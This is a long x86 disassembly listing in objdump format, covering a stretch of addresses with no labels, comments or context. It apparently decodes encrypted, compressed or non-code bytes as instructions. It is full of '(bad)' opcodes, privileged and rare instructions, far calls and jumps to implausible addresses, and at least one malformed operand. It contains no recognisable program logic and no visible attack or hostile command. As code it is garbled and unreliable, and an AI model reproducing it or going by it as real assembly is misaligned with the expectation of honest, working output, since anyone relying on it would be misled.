  421cf2:	or     eax,0xe5ca923a
  421cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cf8:	out    dx,al
  421cf9:	sahf   
  421cfa:	cmp    esi,eax
  421cfc:	sbb    BYTE PTR [ebp+0x5cf05bb0],cl
  421d02:	aam    0xfc
  421d04:	pop    es
  421d05:	jbe    0x421cc2
  421d07:	push   ss
  421d08:	std    
  421d09:	(bad)
  421d0c:	pop    eax
  421d0d:	outs   dx,DWORD PTR ds:[esi]
  421d0e:	and    eax,0x49fee2b4
  421d13:	pop    ebp
  421d14:	cli    
  421d15:	cld    
  421d16:	test   al,0xbd
  421d18:	sbb    DWORD PTR [edi-0x1e6751e9],0x18
  421d1f:	lds    edx,FWORD PTR [ebx-0x60d331a9]
  421d25:	jne    0x421d12
  421d27:	call   0x74e9:0x8a36006c
  421d2e:	test   DWORD PTR [ebp+0x38bb2fc8],edi
  421d34:	inc    ebx
  421d35:	xchg   edx,eax
  421d36:	outs   dx,DWORD PTR ds:[esi]
  421d37:	mov    al,ds:0x28867a17
  421d3c:	scas   eax,DWORD PTR es:[edi]
  421d3d:	mov    fs,WORD PTR [ebp-0x5e]
  421d40:	push   0xae978556
  421d45:	push   ebx
  421d46:	mov    eax,ds:0xfdf2b9b3
  421d4b:	inc    eax
  421d4c:	push   eax
  421d4d:	push   esi
  421d4e:	fwait
  421d4f:	imul   ebx,esp,0xffffff93
  421d52:	or     ebp,esp
  421d54:	dec    esi
  421d55:	fbstp  TBYTE PTR [ebp-0x3f044d67]
  421d5b:	bound  ebx,QWORD PTR [ebp+ebp*1-0x35]
  421d5f:	cmp    dl,cl
  421d61:	lds    esi,FWORD PTR [eax+0x6b]
  421d64:	rdmsr  
  421d66:	mov    esp,ecx
  421d68:	cmp    eax,0xf0bb1861
  421d6d:	nop
  421d6e:	pop    esi
  421d6f:	js     0x421d5c
  421d71:	hlt    
  421d72:	mov    bh,0x19
  421d74:	sub    DWORD PTR [ebx],0xd95d3c12
  421d7a:	dec    edi
  421d7b:	mov    ebx,0xcf7f44fa
  421d80:	add    eax,0x9409df3d
  421d85:	lods   eax,DWORD PTR ds:[esi]
  421d86:	xchg   edx,eax
  421d87:	aas    
  421d88:	popa   
  421d89:	xchg   BYTE PTR [esi+0x25],al
  421d8c:	sahf   
  421d8d:	jae    0x421d6a
  421d8f:	and    ebp,DWORD PTR [edx-0x33]
  421d92:	out    dx,eax
  421d93:	rcr    BYTE PTR [ecx+0x40],cl
  421d96:	jmp    0x949c2717
  421d9b:	call   0x5ccf:0x232aaae1
  421da2:	cmp    BYTE PTR [edi],al
  421da4:	(bad)  
  421da5:	icebp  
  421da6:	ffreep st(6)
  421da8:	dec    ecx
  421da9:	and    ebp,DWORD PTR [ebx-0x5e]
  421dac:	xor    al,0x7f
  421dae:	nop
  421daf:	mov    ecx,eax
  421db1:	mov    ebx,0xe238146a
  421db6:	jmp    0x55d9676a
  421dbb:	fwait
  421dbc:	sahf   
  421dbd:	mov    edi,0xd33060e8
  421dc2:	xor    DWORD PTR [edi-0x67436992],edx
  421dc8:	jg     0x421de5
  421dca:	add    esi,esp
  421dcc:	xor    DWORD PTR ds:[ebx-0x6ffb1c77],ebp
  421dd3:	mov    eax,ds:0x9c56522b
  421dd8:	shl    DWORD PTR [ecx-0x7189ed5b],cl
  421dde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ddf:	loop   0x421e30
  421de1:	outs   dx,DWORD PTR ds:[esi]
  421de2:	inc    eax
  421de3:	leave  
  421de4:	and    al,0x11
  421de6:	daa    
  421de7:	loop   0x421dff
  421de9:	and    esi,DWORD PTR [ecx]
  421deb:	add    al,0xa2
  421ded:	ja     0x421d8a
  421def:	push   eax
  421df0:	push   eax
  421df1:	repz loopne 0x421da6
  421df4:	dec    esi
  421df5:	les    edx,FWORD PTR [ecx+0x6d]
  421df8:	and    al,0xac
  421dfa:	call   0x8a69:0xdf1a3171
  421e01:	xchg   ebp,eax
  421e02:	dec    ebp
  421e03:	push   ecx
  421e04:	cmp    al,0xab
  421e06:	out    dx,al
  421e07:	pushf  
  421e08:	rol    DWORD PTR [esi-0xe8a19a7],cl
  421e0e:	xchg   ebp,eax
  421e0f:	icebp  
  421e10:	retf   
  421e11:	mov    DWORD PTR [esi+0x53],ecx
  421e14:	pusha  
  421e15:	loope  0x421e82
  421e17:	xor    ebp,DWORD PTR [esi-0x4c]
  421e1a:	or     esi,DWORD PTR [esi+0x15b450ed]
  421e20:	adc    BYTE PTR [ebx+0x63c37da2],bh
  421e26:	and    DWORD PTR ds:0x5e71581,edi
  421e2c:	sub    eax,DWORD PTR [edi+edx*4]
  421e2f:	test   edi,edi
  421e31:	sahf   
  421e32:	int    0x9c
  421e34:	(bad)  
  421e35:	cmp    esp,esp
  421e37:	add    ebx,DWORD PTR [edi+ebx*1]
  421e3a:	and    BYTE PTR [edx+0x422532ec],cl
  421e40:	mov    ds:0x95f5c83,al
  421e45:	fidivr WORD PTR [edi]
  421e47:	inc    ebx
  421e48:	push   ss
  421e49:	retf   0x85b7
  421e4c:	cmp    DWORD PTR [edx+0x45],edx
  421e4f:	outs   dx,DWORD PTR ds:[esi]
  421e50:	jle    0x421e30
  421e52:	dec    eax
  421e53:	push   0x652792ac
  421e58:	xchg   edx,eax
  421e59:	sti    
  421e5a:	fidivr DWORD PTR ds:0xeb8c8d5d
  421e60:	jge    0x421e6b
  421e62:	push   ss
  421e63:	mov    edi,0xf08e6813
  421e68:	rol    DWORD PTR [edx],0xd2
  421e6b:	lods   al,BYTE PTR ds:[esi]
  421e6c:	xchg   ebx,eax
  421e6d:	cmp    esp,DWORD PTR [eax+0x3e]
  421e70:	fbld   TBYTE PTR [esi+0x5cfde990]
  421e76:	add    eax,0xe236d2ba
  421e7b:	mov    eax,0x7774a8e3
  421e80:	mov    al,0xe1
  421e82:	xor    eax,0x93e92ce8
  421e87:	push   DWORD PTR [ecx+0x4e7312a9]
  421e8d:	loopne 0x421ec1
  421e8f:	inc    edx
  421e90:	sbb    al,0xfd
  421e92:	dec    DWORD PTR [ebp+0x43]
  421e95:	hlt    
  421e96:	aaa    
  421e97:	dec    edx
  421e98:	leave  
  421e99:	mov    cl,0xbd
  421e9b:	fcom   DWORD PTR [ebp+0x20]
  421e9e:	push   ebx
  421e9f:	sub    BYTE PTR [esi],bl
  421ea1:	test   DWORD PTR ds:0xb1481c75,ebx
  421ea7:	out    0xe9,al
  421ea9:	(bad)  
  421eaa:	mov    WORD PTR [eax+eiz*2],fs
  421ead:	cmp    al,0xcc
  421eaf:	test   DWORD PTR [esi-0xb],esi
  421eb2:	lea    ecx,[edi]
  421eb4:	daa    
  421eb5:	cmp    dh,BYTE PTR [eax+ecx*2-0x2a]
  421eb9:	fild   DWORD PTR [ebp+0x5d]
  421ebc:	and    eax,0xa545bd6c
  421ec1:	es xchg ecx,eax
  421ec3:	add    eax,0x5fb72693
  421ec8:	mov    ds:0x2e63e61a,al
  421ecd:	enter  0x68fa,0x1
  421ed1:	pop    esp
  421ed2:	mov    ebx,DWORD PTR [esi+0xa7f2e4a]
  421ed8:	mov    ah,0xa8
  421eda:	in     eax,0xc1
  421edc:	fs push esp
  421ede:	retf   
  421edf:	outs   dx,BYTE PTR ds:[esi]
  421ee0:	(bad)  
  421ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ee2:	into   
  421ee3:	ret    
  421ee4:	ret    0x72fd
  421ee7:	push   es
  421ee8:	or     eax,0x5cef1abd
  421eed:	fs cld 
  421eef:	push   esi
  421ef0:	or     al,0x1d
  421ef2:	jo     0x421f48
  421ef4:	cmp    DWORD PTR [ebx],0xa20e5883
  421efa:	dec    eax
  421efb:	or     al,0xf5
  421efd:	mov    cl,0x19
  421eff:	pop    esi
  421f00:	push   ebp
  421f01:	dec    ebp
  421f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f03:	push   esi
  421f04:	xor    eax,0x1d6be7c2
  421f09:	xor    ecx,ecx
  421f0b:	nop
  421f0c:	int3   
  421f0d:	sbb    DWORD PTR [edi+0x54b99432],edx
  421f13:	or     al,0x60
  421f15:	in     al,0xb5
  421f17:	mov    ecx,0xa7361a6f
  421f1c:	dec    ecx
  421f1d:	or     dl,BYTE PTR [esp+eax*2+0x34816d12]
  421f24:	pushf  
  421f25:	jle    0x421edd
  421f27:	outs   dx,DWORD PTR ds:[esi]
  421f28:	stos   DWORD PTR es:[edi],eax
  421f29:	loope  0x421f97
  421f2b:	(bad)  
  421f2c:	test   eax,0xce46f9b7
  421f31:	add    DWORD PTR [ecx+eiz*2],edx
  421f34:	mov    cl,0x52
  421f36:	test   eax,0x64ab2d99
  421f3b:	call   0xbb79efb7
  421f40:	or     DWORD PTR [ebp-0x34],0x9867ccf5
  421f47:	fadd   st,st(1)
  421f49:	sar    DWORD PTR [ebx+eiz*2],1
  421f4c:	sbb    al,0x1c
  421f4e:	and    ecx,DWORD PTR [ecx-0x727239cd]
  421f54:	hlt    
  421f55:	and    BYTE PTR [ebx+0x6ce6ef0b],al
  421f5b:	shl    DWORD PTR [eax],0x3e
  421f5e:	xor    ebx,DWORD PTR ds:0x2df70be8
  421f64:	dec    eax
  421f65:	(bad)  
  421f66:	(bad)  
  421f67:	das    
  421f68:	aas    
  421f69:	xchg   BYTE PTR [edx-0x57],ch
  421f6c:	rol    esp,cl
  421f6e:	adc    edi,DWORD PTR cs:[edx]
  421f71:	push   0xffffffaf
  421f73:	pop    ebp
  421f74:	jmp    0x19b9ad1a
  421f79:	repz dec ebp
  421f7b:	aam    0x8b
  421f7d:	(bad)  
  421f7e:	aam    0x36
  421f80:	xchg   esi,eax
  421f81:	mov    dl,0xfe
  421f83:	bound  edx,QWORD PTR [ecx]
  421f85:	pushf  
  421f86:	push   cs
  421f87:	fild   WORD PTR [eax+ebx*1-0x35]
  421f8b:	test   al,0x8d
  421f8d:	mul    BYTE PTR [esi+ecx*8-0x10f98fa9]
  421f94:	dec    ebx
  421f95:	arpl   WORD PTR [ecx+0x15],di
  421f98:	sub    BYTE PTR [ebx-0x39782dfe],dl
  421f9e:	or     eax,DWORD PTR [edi]
  421fa0:	clc    
  421fa1:	inc    esp
  421fa2:	fcomp  QWORD PTR [ebx-0x1f698153]
  421fa8:	jle    0x421fe4
  421faa:	pusha  
  421fab:	pop    es
  421fac:	sar    BYTE PTR [eax-0x6e],1
  421faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fb0:	ret    0x76bb
  421fb3:	imul   esp,edi,0xffffffd6
  421fb6:	mov    al,BYTE PTR [edx]
  421fb8:	push   edx
  421fb9:	dec    ebp
  421fba:	and    ah,BYTE PTR [edi+eiz*8+0x18306a58]
  421fc1:	fimul  DWORD PTR [ecx+0x33ec0522]
  421fc7:	dec    eax
  421fc8:	adc    DWORD PTR ds:0x48790492,ecx
  421fce:	pushf  
  421fcf:	out    0xd8,eax
  421fd1:	xor    cl,BYTE PTR ds:0xe6d038a3
  421fd7:	mov    ds:0xe1871d47,al
  421fdc:	pop    ds
  421fdd:	jmp    0xb4a6:0x387d5a2c
  421fe4:	push   ds
  421fe5:	xor    al,0x37
  421fe7:	call   0x3b3c:0x9c22f1fc
  421fee:	push   ss
  421fef:	leave  
  421ff0:	xor    al,0xc7
  421ff2:	pop    ebp
  421ff3:	inc    ecx
  421ff4:	adc    DWORD PTR [esi-0xd],ebx
  421ff7:	mov    dh,ch
  421ff9:	inc    edi
  421ffa:	retf   0xca10
  421ffd:	sbb    BYTE PTR [ebx-0x2f],bl
  422000:	es hlt 
  422002:	bnd jnp 0x421fcb
  422005:	pop    edx
  422006:	ins    BYTE PTR es:[edi],dx
  422007:	cmp    BYTE PTR [ebp+0x96f4202],al
  42200d:	xor    edi,0x680f42fe
  422013:	mov    WORD PTR [edi+0x7c7f2e9f],es
  422019:	ds lahf 
  42201b:	jnp    0x421fc2
  42201d:	and    DWORD PTR [eax-0x6768b360],0x4be6635
  422027:	clc    
  422028:	rcl    BYTE PTR [ebp-0xe7751ef],0xf4
  42202f:	pop    ecx
  422030:	pop    edx
  422031:	dec    ebx
  422032:	nop
  422033:	sub    DWORD PTR [eax-0x27],ebx
  422036:	xor    BYTE PTR [eax+0x3c],dl
  422039:	shr    esi,0xb9
  42203c:	push   edi
  42203d:	add    BYTE PTR [esi],0xbd
  422040:	xor    ecx,ecx
  422042:	adc    al,0xb9
  422044:	xchg   edx,eax
  422045:	sub    BYTE PTR [ebp+0x6519a94d],ah
  42204b:	or     BYTE PTR [ecx+0x13],ch
  42204e:	and    BYTE PTR [ebx-0x2c],dh
  422051:	enter  0x1ace,0x6c
  422055:	sti    
  422056:	imul   esp,DWORD PTR [edi],0xfffffff7
  422059:	mov    eax,ds:0xda00336a
  42205e:	shl    DWORD PTR [ecx+edi*2],1
  422061:	inc    ebx
  422062:	xchg   DWORD PTR [ebx+0x6a94c620],esp
  422068:	mov    eax,DWORD PTR [eax+0x31]
  42206b:	xchg   esi,eax
  42206c:	add    esp,ebx
  42206e:	xor    al,0xa0
  422070:	inc    edi
  422071:	aad    0xf2
  422073:	sti    
  422074:	pop    edi
  422075:	and    ebx,esi
  422077:	push   ecx
  422078:	or     eax,0xb454e72e
  42207d:	(bad)  
  42207e:	adc    al,0x6
  422080:	fistp  DWORD PTR [ebp-0x1a7b00d1]
  422086:	std    
  422087:	jg     0x4220c2
  422089:	aam    0x99
  42208b:	pop    ss
  42208c:	jbe    0x422023
  42208e:	enter  0x1a0a,0x8b
  422092:	iret   
  422093:	enter  0x98e6,0x45
  422097:	fstp   QWORD PTR [edi-0xe733a05]
  42209d:	xor    esp,0x61
  4220a0:	sahf   
  4220a1:	push   esp
  4220a2:	mov    ch,0xba
  4220a4:	fcom   QWORD PTR [eax+0x30]
  4220a7:	mov    ds:0x41249ec9,eax
  4220ac:	pop    edx
  4220ad:	and    eax,0xf5ad43c8
  4220b2:	lods   eax,DWORD PTR ds:[esi]
  4220b3:	ret    0x6c1e
  4220b6:	pop    ds
  4220b7:	cdq    
  4220b8:	xor    eax,esp
  4220ba:	sub    al,0x90
  4220bc:	mov    BYTE PTR [ebp-0x73],0x76
  4220c0:	mov    dh,0x68
  4220c2:	xchg   esi,eax
  4220c3:	pusha  
  4220c4:	sti    
  4220c5:	xchg   ebp,eax
  4220c6:	retf   
  4220c7:	push   esp
  4220c8:	sub    al,0xba
  4220ca:	arpl   si,bp
  4220cc:	out    0x88,eax
  4220ce:	sbb    edi,edx
  4220d0:	fstp   QWORD PTR [ecx-0x299b8856]
  4220d6:	xchg   esi,eax
  4220d7:	jge    0x42211a
  4220d9:	scas   eax,DWORD PTR es:[edi]
  4220da:	xchg   esi,eax
  4220db:	mov    al,0x1
  4220dd:	call   0x80679ff0
  4220e2:	inc    esp
  4220e3:	pop    edx
  4220e4:	cwde   
  4220e5:	mov    ds:0x4380786f,al
  4220ea:	sbb    DWORD PTR [esi-0x4],esi
  4220ed:	push   0x5659464d
  4220f2:	jno    0x422081
  4220f4:	call   0x3d621ba2
  4220f9:	or     DWORD PTR [ecx],edx
  4220fb:	in     al,dx
  4220fc:	fisttp WORD PTR [eax+0x58e25d07]
  422102:	inc    edx
  422103:	xchg   ecx,eax
  422104:	adc    al,0xff
  422106:	test   eax,0xa3226100
  42210b:	int3   
  42210c:	call   0xda17e300
  422111:	fidivr WORD PTR [ecx-0x77]
  422114:	repz in eax,0xb3
  422117:	aad    0x5b
  422119:	dec    ebx
  42211a:	pop    eax
  42211b:	loopne 0x4220e4
  42211d:	push   ebp
  42211e:	adc    ah,al
  422120:	jp     0x42219e
  422122:	ja     0x42213d
  422124:	inc    ecx
  422125:	pop    ss
  422126:	dec    esi
  422127:	(bad)  
  422128:	out    0x5e,al
  42212a:	mov    ?,edi
  42212c:	(bad)  
  42212d:	call   0xb1409dd7
  422132:	int3   
  422133:	stos   BYTE PTR es:[edi],al
  422134:	into   
  422135:	test   eax,0xf416e182
  42213a:	inc    ebx
  42213b:	pop    edx
  42213c:	mov    ch,0x2b
  42213e:	mov    ds:0xc956d718,eax
  422143:	sti    
  422144:	addr16 jns 0x42212d
  422147:	test   eax,0x5c42c7b1
  42214c:	mov    cl,0x89
  42214e:	push   edi
  42214f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422150:	cdq    
  422151:	cmp    eax,0x449b441d
  422156:	jb     0x4221a4
  422158:	fwait
  422159:	jecxz  0x4220ea
  42215b:	hlt    
  42215c:	lds    esi,FWORD PTR [esi]
  42215e:	add    BYTE PTR [edi+0x7c7b47e5],dh
  422164:	inc    edi
  422165:	mov    edi,0xe2f69f6c
  42216a:	jg     0x422152
  42216c:	and    eax,0x4e1677a3
  422171:	cli    
  422172:	mov    ecx,0x92beb9b3
  422177:	jo     0x4221a4
  422179:	push   cs
  42217a:	sub    al,0x68
  42217c:	arpl   WORD PTR [edi-0x25a91c64],sp
  422182:	push   es
  422183:	ret    
  422184:	jg     0x42211a
  422186:	xchg   esi,eax
  422187:	test   BYTE PTR [ebx],bh
  422189:	dec    DWORD PTR [edx+ebp*1-0x49d4cbf3]
  422190:	pop    ebx
  422191:	ds or  al,0x47
  422194:	adc    al,0xfd
  422196:	jns    0x4221d4
  422198:	cld    
  422199:	into   
  42219a:	push   ebp
  42219b:	fstp   TBYTE PTR [edx+0x17]
  42219e:	frstor [eax+eax*2+0x2a2bd7da]
  4221a5:	inc    eax
  4221a6:	fld    QWORD PTR [esi+0x530893aa]
  4221ac:	mov    ah,BYTE PTR [eax-0x13]
  4221af:	add    ah,BYTE PTR [edi+edx*8]
  4221b2:	xchg   esi,eax
  4221b3:	xor    eax,0xbce35d7a
  4221b8:	xchg   dl,dh
  4221ba:	sahf   
  4221bb:	adc    ch,BYTE PTR [edx+0x5]
  4221be:	fsubr  QWORD PTR [ebx+esi*4+0x426f3243]
  4221c5:	js     0x422200
  4221c7:	stos   BYTE PTR es:[edi],al
  4221c8:	dec    ecx
  4221ca:	fbstp  TBYTE PTR [edi-0x4d4df43c]
  4221d0:	mov    bh,0x7e
  4221d2:	cmc    
  4221d3:	pop    es
  4221d4:	inc    ecx
  4221d5:	mov    ah,ch
  4221d7:	sbb    BYTE PTR ds:0xcd6e0635,ch
  4221dd:	pop    ds
  4221de:	repnz mov dl,0xac
  4221e1:	hlt    
  4221e2:	jmp    0x4599bc
  4221e7:	iret   
  4221e8:	push   ds
  4221e9:	out    0xef,al
  4221eb:	repz fistp DWORD PTR [esi-0x33150123]
  4221f2:	ret    0xc58f
  4221f5:	push   ss
  4221f6:	jg     0x4221f8
  4221f8:	and    eax,0xe259e5c9
  4221fd:	sub    edx,edi
  4221ff:	push   edi
  422200:	jmp    0xf412d455
  422205:	jnp    0x422204
  422207:	sub    ecx,0xa49e57c6
  42220d:	mov    WORD PTR [edx],ss
  42220f:	adc    eax,0x5a86508b
  422214:	sti    
  422215:	fbld   TBYTE PTR [ebx]
  422217:	xchg   ecx,eax
  422218:	mov    ecx,0x9be3065d
  42221d:	and    dl,ch
  42221f:	outs   dx,BYTE PTR ds:[esi]
  422220:	sbb    al,0x9e
  422222:	(bad)  
  422223:	inc    ebp
  422224:	jae    0x42225c
  422226:	xor    al,0xf
  422229:	call   0x1476:0x3cc97e80
  422230:	adc    esi,edi
  422232:	xor    al,0xff
  422234:	(bad)  
  422235:	mov    al,ds:0xc11da3b8
  42223a:	stos   DWORD PTR es:[edi],eax
  42223b:	and    edx,DWORD PTR [edi+0x22]
  42223e:	jbe    0x42224e
  422240:	xor    esp,ebx
  422242:	cdq    
  422243:	inc    edi
  422244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422245:	int3   
  422246:	dec    esi
  422247:	ret    
  422248:	inc    ecx
  422249:	fs mov eax,0x6781840d
  42224f:	dec    ebp
  422250:	push   0xfffffff5
  422252:	(bad)  [ebx+0x35]
  422255:	cmp    al,BYTE PTR [esi+0x24d48bd7]
  42225b:	ror    bl,0x6
  42225e:	mov    esi,0xbae3916f
  422263:	sbb    DWORD PTR [ecx-0x24d4521d],ebx
  422269:	push   edx
  42226a:	mov    bh,0x7e
  42226c:	scas   al,BYTE PTR es:[edi]
  42226d:	pop    edx
  42226e:	cmp    al,0xa5
  422270:	jno    0x4222c1
  422272:	jo     0x4222ae
  422274:	sub    al,0x17
  422276:	imul   ebx,DWORD PTR [esi+esi*8+0x4eafc482],0x6a
  42227e:	fwait
  42227f:	jns    0x42222a
  422281:	push   ss
  422282:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  422284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422285:	retf   0xc8da
  422288:	cli    
  422289:	jg     0x4222f7
  42228b:	loop   0x4222b6
  42228d:	dec    ecx
  42228e:	cs stc 
  422290:	dec    edx
  422291:	mov    edx,0x3a30b6e9
  422296:	imul   edi,DWORD PTR [esi],0x38bbe310
  42229c:	lds    ebx,FWORD PTR [esi+0x3a]
  42229f:	loop   0x422255
  4222a1:	aaa    
  4222a2:	or     DWORD PTR [edi+0x13],edi
  4222a5:	mov    BYTE PTR [edx],bh
  4222a7:	adc    eax,0xdfbf870f
  4222ac:	ins    DWORD PTR es:[edi],dx
  4222ad:	jle    0x4222e8
  4222af:	and    dh,BYTE PTR [esi-0x2bd742aa]
  4222b5:	xchg   edx,eax
  4222b6:	jns    0x42226a
  4222b8:	and    BYTE PTR [edi+eiz*4+0x68],cl
  4222bc:	xchg   esp,eax
  4222bd:	push   eax
  4222be:	inc    ecx
  4222bf:	scas   al,BYTE PTR es:[edi]
  4222c0:	shr    BYTE PTR [edi+eiz*2+0x5b104807],cl
  4222c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222c8:	loope  0x4222f2
  4222ca:	pop    es
  4222cb:	cwde   
  4222cc:	jb     0x4222f4
  4222ce:	pop    edx
  4222cf:	adc    ah,al
  4222d1:	imul   esp,DWORD PTR [edx+0xa],0x33
  4222d5:	cwde   
  4222d6:	push   ebp
  4222d7:	iret   
  4222d8:	ror    BYTE PTR [ebp+0x24b16ac1],1
  4222de:	jg     0x422294
  4222e0:	xchg   ecx,eax
  4222e1:	dec    ebp
  4222e2:	jge    0x4222e4
  4222e4:	jl     0x4222c3
  4222e6:	inc    edi
  4222e7:	mov    al,0x78
  4222e9:	outs   dx,DWORD PTR ds:[esi]
  4222ea:	mov    ch,0x22
  4222ec:	add    DWORD PTR [eax-0x4741539],ebx
  4222f2:	jo     0x4222e2
  4222f4:	cli    
  4222f5:	sub    esi,0x71e3b3d6
  4222fb:	in     eax,dx
  4222fc:	repz cmp ecx,esp
  4222ff:	jle    0x422342
  422301:	dec    edi
  422302:	and    al,0x22
  422304:	jno    0x42230f
  422306:	in     al,dx
  422307:	pop    eax
  422308:	data16 adc al,BYTE PTR [ebx+edi*1+0xd3265a7]
  422310:	add    eax,0xf2797cd0
  422315:	xchg   ebx,eax
  422316:	jb     0x422299
  422318:	and    DWORD PTR [edi+eiz*8],ebp
  42231b:	xor    BYTE PTR [ebx],ah
  42231d:	mov    ds:0xbfb1255b,eax
  422322:	push   edx
  422323:	push   edi
  422324:	cmp    esp,DWORD PTR [eax]
  422326:	inc    eax
  422327:	jne    0x42237c
  422329:	pop    edx
  42232a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42232b:	bound  edi,QWORD PTR [edi]
  42232d:	jg     0x4222b0
  42232f:	pop    eax
  422330:	repz jle 0x422377
  422333:	scas   al,BYTE PTR es:[edi]
  422334:	std    
  422335:	mov    ebp,0xc2045ba0
  42233a:	mov    DWORD PTR [eax],ebp
  42233c:	sbb    DWORD PTR [ebx-0x29],edi
  42233f:	or     eax,0x9918ca14
  422344:	adc    eax,esi
  422346:	mov    edx,DWORD PTR [edi]
  422348:	hlt    
  422349:	fsub   QWORD PTR [edi+0x16480fcc]
  42234f:	(bad)  
  422351:	cmovns ecx,DWORD PTR [esi+0x45b1e70]
  422358:	pop    ebp
  422359:	and    eax,0x782fa9ee
  42235e:	retf   
  42235f:	sub    esp,ebx
  422361:	xlat   BYTE PTR ds:[ebx]
  422362:	mov    BYTE PTR [edi+0x226ac153],0x57
  422369:	push   ebx
  42236a:	sbb    ah,ch
  42236c:	sub    al,0x47
  42236e:	or     al,0x22
  422370:	mov    eax,ds:0x6d08a5a2
  422375:	xor    eax,0x13b335b1
  42237a:	sbb    eax,DWORD PTR [edi+0x75313de7]
  422380:	sahf   
  422381:	repz in al,dx
  422383:	stos   BYTE PTR es:[edi],al
  422384:	leave  
  422385:	test   eax,0xfddf479f
  42238a:	jo     0x4223d0
  42238c:	imul   esp,DWORD PTR [eax-0x275a2305],0xad3ebcdf
  422396:	jecxz  0x422347
  422398:	ins    BYTE PTR es:[edi],dx
  422399:	cmp    al,0x81
  42239b:	mov    eax,ds:0x6fc0a6cf
  4223a0:	jmp    0x4223de
  4223a2:	add    ah,BYTE PTR [ebx+0x5a]
  4223a5:	outs   dx,BYTE PTR ds:[esi]
  4223a6:	fidiv  DWORD PTR [eax]
  4223a8:	cmp    eax,0x50b01256
  4223ad:	inc    edi
  4223ae:	fld    st(1)
  4223b0:	or     DWORD PTR [ebp+0x78],ebp
  4223b3:	and    esi,DWORD PTR [edx-0x17]
  4223b6:	repz push cs
  4223b8:	pop    es
  4223b9:	int    0x3b
  4223bb:	shl    DWORD PTR [eax+0x72],cl
  4223be:	or     BYTE PTR [ecx],bh
  4223c0:	add    eax,0xe8592bc6
  4223c5:	enter  0x77f8,0xb
  4223c9:	hlt    
  4223ca:	gs dec ecx
  4223cc:	and    eax,0x3db7c42d
  4223d1:	in     al,dx
  4223d2:	fistp  QWORD PTR [edx-0x65]
  4223d5:	add    ebp,DWORD PTR [ecx+0x1f]
  4223d8:	arpl   WORD PTR [edi+0x7f3e1d65],si
  4223de:	fadd   st,st(0)
  4223e0:	ror    ch,cl
  4223e2:	or     edx,DWORD PTR [edi-0xc525eef]
  4223e8:	nop
  4223e9:	mov    bl,0x6b
  4223eb:	not    BYTE PTR [ebx*2+0x3650c6e8]
  4223f2:	mov    esp,DWORD PTR [eax]
  4223f4:	aas    
  4223f5:	ret    0xec29
  4223f8:	xor    eax,0xe931c072
  4223fd:	(bad)  
  4223fe:	fild   DWORD PTR [edx-0x1f73a111]
  422404:	xchg   esi,eax
  422405:	std    
  422406:	repz mov al,0xa8
  422409:	lock push cs
  42240b:	sub    eax,0xdb2f69d6
  422410:	in     al,dx
  422411:	js     0x422486
  422413:	xchg   ebp,eax
  422414:	loop   0x422414
  422416:	xchg   esp,eax
  422417:	cmp    BYTE PTR [edi-0x1296c645],0x51
  42241e:	fs std 
  422420:	mov    al,ds:0x66fc8d9b
  422425:	test   eax,0x1947f33d
  42242a:	push   eax
  42242b:	scas   al,BYTE PTR es:[edi]
  42242c:	inc    edi
  42242d:	add    al,0x6
  42242f:	lds    esi,FWORD PTR [eax+ebp*2+0x25610374]
  422436:	mov    WORD PTR [edi-0x53],es
  422439:	mov    ds:0x792ab1ef,al
  42243e:	neg    DWORD PTR [ebx+esi*2+0x1578502b]
  422445:	mov    ds:0xcb2dd222,al
  42244a:	cs dec edi
  42244c:	adc    eax,0x1b368e2c
  422451:	retf   
  422452:	adc    BYTE PTR [ebp+esi*1-0x67753932],0xb0
  42245a:	(bad)  
  42245b:	lods   eax,DWORD PTR ds:[esi]
  42245c:	lds    esi,FWORD PTR [edx]
  42245e:	das    
  42245f:	test   eax,0xd899381
  422464:	mov    DWORD PTR [ecx+0x2bf32033],esp
  42246a:	mov    esp,0x2578c4e9
  42246f:	jno    0x4223f5
  422471:	add    BYTE PTR [ecx+0x45],ah
  422474:	adc    eax,0x3a07acf
  422479:	pop    esp
  42247a:	ror    BYTE PTR [ecx+0x7f],cl
  42247d:	xchg   edx,eax
  42247e:	pop    ebp
  42247f:	adc    al,0xdd
  422481:	push   edi
  422482:	xor    al,0x56
  422484:	ret    
  422485:	or     DWORD PTR [eax-0x3],edi
  422488:	mov    al,0xc6
  42248a:	data16 scas al,BYTE PTR es:[edi]
  42248c:	dec    ebp
  42248d:	stos   BYTE PTR es:[edi],al
  42248e:	mov    BYTE PTR [ebx],ch
  422490:	cmp    al,ch
  422492:	repnz inc esi
  422494:	popf   
  422495:	popf   
  422496:	pop    esp
  422497:	mov    al,0x63
  422499:	das    
  42249a:	jle    0x4224cf
  42249c:	pusha  
  42249d:	test   al,0x60
  42249f:	dec    esi
  4224a0:	sub    ecx,edi
  4224a2:	ret    
  4224a3:	icebp  
  4224a4:	aaa    
  4224a5:	push   esi
  4224a6:	retf   0x5b50
  4224a9:	ss (bad) 
  4224ab:	adc    cl,BYTE PTR [edi]
  4224ad:	mov    bh,0x2f
  4224af:	icebp  
  4224b0:	or     bl,BYTE PTR [edx-0x45380e96]
  4224b6:	adc    DWORD PTR [ebx+ecx*2+0x79],edi
  4224ba:	imul   BYTE PTR [edi+0x6e]
  4224bd:	dec    esp
  4224be:	stos   DWORD PTR es:[edi],eax
  4224bf:	sbb    esp,DWORD PTR [ebx]
  4224c1:	push   cs
  4224c2:	dec    ecx
  4224c3:	ret    0x66b
  4224c6:	ss ds call 0x5799df60
  4224cd:	int    0x3c
  4224cf:	loop   0x422455
  4224d1:	(bad)  
  4224d2:	inc    eax
  4224d3:	mov    ah,BYTE PTR [edx+0x71]
  4224d6:	fs sti 
  4224d8:	mov    ds:0x44350fe2,eax
  4224dd:	dec    ebx
  4224de:	test   eax,0x35064733
  4224e3:	int3   
  4224e4:	mov    ds:0x7f744d2,eax
  4224e9:	rcr    DWORD PTR fs:[eax],1
  4224ec:	sub    ecx,esi
  4224ee:	dec    ebx
  4224ef:	stc    
  4224f0:	popa   
  4224f1:	shl    al,1
